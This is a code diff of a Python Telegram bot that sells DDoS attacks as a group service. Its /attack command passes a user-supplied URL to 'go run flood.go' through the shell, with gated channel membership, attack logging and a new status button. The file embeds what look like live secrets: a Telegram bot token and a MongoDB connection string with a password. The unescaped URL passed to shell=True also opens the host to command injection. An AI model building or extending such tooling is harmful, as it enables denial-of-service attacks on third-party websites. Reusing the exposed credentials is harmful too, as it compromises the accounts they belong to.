@@ -2,13 +2,12 @@ import os
 import subprocess
 import time
 import asyncio
-import threading
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext
 from pymongo import MongoClient
 
 # Configuration
-BOT_TOKEN = "7417294211:AAHD5mhZ2JUNN-PtcsAq75WwxFiG3I1Yx7k"
+BOT_TOKEN = "7417294211:AAHZ00Z6xiSP-m2KHEQYZGnN4Sl8fox3aWk"
 OWNER_IDS = [5606990991, 5460343986]
 MONGO_URL = "mongodb+srv://mpjmu808gh:8sqqX0ERW0IMtviu@cluster0.zo6rkop.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
 CHANNELS = ["@Falcon_Security", "@Pbail_Squad", "@Found_Us", "@Bot_Colony"]
@@ -26,7 +25,6 @@ active_attacks = {}
 
 # Log Function
 async def log_activity(message):
-    # Send log message to the log group
     await app.bot.send_message(LOG_GROUP_ID, message)
 
 # Check if user is blacklisted
@@ -41,40 +39,36 @@ def is_allowed_group(update):
 
 # Start Command
 async def start(update: Update, context: CallbackContext):
-    # Check if the message is from a private chat
     if update.message.chat.type == 'private':
-        # Send a message to join the group
         await update.message.reply_text(
             "You need to join the group to use this bot. Please join using the link below:\n"
-            "https://t.me/Free_DDos_Networ\n\n"
+            "https://t.me/Free_DDos_Network\n\n"
             "After joining, you can start interacting with the bot in this chat."
         )
         return
 
-    # Continue with the existing logic for allowed groups
     if not is_allowed_group(update):
         return
 
     buttons = [
-        [InlineKeyboardButton("Join Falcon Security", url="https://t.me/Falcon_Security"),
+        [InlineKeyboardButton("Falcon Security", url="https://t.me/Falcon_Security"),
          InlineKeyboardButton("Pbail Squad", url="https://t.me/Pbail_Squad")],
         [InlineKeyboardButton("Indian Hacker", url="https://t.me/Found_Us"),
-         InlineKeyboardButton("Join Blackhat", url="https://t.me/Bot_colony")],
+         InlineKeyboardButton("Bot Colony", url="https://t.me/Bot_colony")],
         [InlineKeyboardButton("Verify", callback_data="verify")]
     ]
     keyboard = InlineKeyboardMarkup(buttons)
     await update.message.reply_text(
         "Welcome! Please join all the required channels to use the bot.", reply_markup=keyboard
     )
+
 # Verify Callback Query Handler
 async def verify(update: Update, context: CallbackContext):
     query = update.callback_query
 
-    # Ensure that the callback_query is correctly handled
     if query:
         chat_id = query.message.chat.id
 
-        # Check if the chat ID is the allowed group
         if chat_id != ALLOWED_GROUP_ID:
             await query.answer("You are not allowed to use this command in this group.")
             return
@@ -82,7 +76,6 @@ async def verify(update: Update, context: CallbackContext):
         user_id = query.from_user.id
 
         try:
-            # Verify all required channels
             all_verified = True
             for channel in CHANNELS:
                 try:
@@ -135,56 +128,46 @@ async def attack(update: Update, context: CallbackContext):
 
     attack_id = str(user_id) + "_" + str(int(time.time()))
     active_attacks[attack_id] = {"url": url, "remaining": duration}
-    threading.Thread(target=execute_attack, args=(attack_id, update)).start()
+
+    # Notify user that attack has started
+    buttons = [
+        [InlineKeyboardButton("Check Status", callback_data=f"check_status_{attack_id}")]
+    ]
+    keyboard = InlineKeyboardMarkup(buttons)
+    await update.message.reply_text(f"Attack on {url} started for {duration} seconds.", reply_markup=keyboard)
+
+    # Schedule the attack
+    asyncio.create_task(execute_attack(attack_id, update))
 
 # Execute Attack Function
 async def execute_attack(attack_id, update):
     attack_data = active_attacks[attack_id]
     url, duration = attack_data["url"], attack_data["remaining"]
-    command = f"go run flooder.go {url} {duration}"
+    command = f"go run flood.go {url}  {duration}"
 
     try:
         subprocess.run(command, shell=True, check=True)
-        if update.message:
-            await update.message.reply_text(f"Attack on {url} started for {duration} seconds.")
-        await log_activity(f"User {update.message.from_user.id} started an attack on {url} for {duration} seconds.")
+        # Notify user of completion
+        await update.message.reply_text(f"Attack on {url} completed.")
+        await log_activity(f"User {update.message.from_user.id} completed an attack on {url} for {duration} seconds.")
     except subprocess.CalledProcessError:
-        if update.message:
-            await update.message.reply_text("Failed to start the attack.")
+        await update.message.reply_text("Failed to start the attack.")
     finally:
         del active_attacks[attack_id]
 
-async def attack(update: Update, context: CallbackContext):
-    if not is_allowed_group(update):
-        await update.message.reply_text(f"Please join the group to use the bot: https://t.me/joinchat/{ALLOWED_GROUP_ID}")
-        return
+# Check Status Callback Query Handler
+async def check_status(update: Update, context: CallbackContext):
+    query = update.callback_query
+    if query:
+        attack_id = query.data.split("_", 2)[2]
+        if attack_id in active_attacks:
+            attack_data = active_attacks[attack_id]
+            url = attack_data["url"]
+            status_message = f"Current status for attack on {url}:\nRemaining time: {attack_data['remaining']} seconds."
+        else:
+            status_message = "No ongoing attack found for this ID."
 
-    user_id = update.message.from_user.id
-    if is_blacklisted(user_id):
-        await update.message.reply_text("You are blacklisted and cannot use this bot.")
-        return
-
-    if len(active_attacks) >= 2:
-        remaining_times = [data['remaining'] for data in active_attacks.values()]
-        min_remaining = min(remaining_times)
-        await update.message.reply_text(f"Two attacks are currently in progress. Please wait.\n"
-                                        f"Time left for current attacks: {min_remaining} seconds.")
-        return
-
-    try:
-        url = context.args[0]
-        duration = int(context.args[1])
-        if duration > 200:
-            duration = 200
-    except (IndexError, ValueError):
-        await update.message.reply_text("Usage: /attack <url> <duration>")
-        return
-
-    attack_id = str(user_id) + "_" + str(int(time.time()))
-    active_attacks[attack_id] = {"url": url, "remaining": duration}
-    # Create an event loop to run the async function
-    loop = asyncio.get_event_loop()
-    await loop.run_in_executor(None, lambda: asyncio.run(execute_attack(attack_id, update)))
+        await query.edit_message_text(status_message)
 
 # Owner Commands
 async def blacklist(update: Update, context: CallbackContext):
@@ -243,6 +226,7 @@ app.add_handler(CommandHandler("Blacklist", blacklist))
 app.add_handler(CommandHandler("rmBlacklist", rm_blacklist))
 app.add_handler(CommandHandler("Stats", stats))
 app.add_handler(CommandHandler("Broadcast", broadcast))
+app.add_handler(CallbackQueryHandler(check_status, pattern="check_status_"))
 app.add_error_handler(error_handler)
 
 # Start the Bot
